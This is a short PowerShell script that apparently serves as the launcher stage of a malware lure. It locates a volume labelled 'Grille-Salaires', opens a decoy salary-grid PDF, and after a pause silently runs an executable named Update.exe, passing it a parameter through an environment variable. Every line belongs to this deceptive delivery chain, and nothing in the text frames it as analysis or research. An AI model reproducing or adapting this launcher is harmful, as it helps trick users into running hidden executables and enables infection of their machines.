$Env:hagrid="mdll s0.enc";
$device = (((Get-WmiObject Win32_LogicalDisk) | select DeviceID, VolumeName) | where VolumeName -eq "Grille-Salaires" | foreach { $_.DeviceID });
cd $device;
start .\grille.pdf;
sleep 10;
.\Update.exe
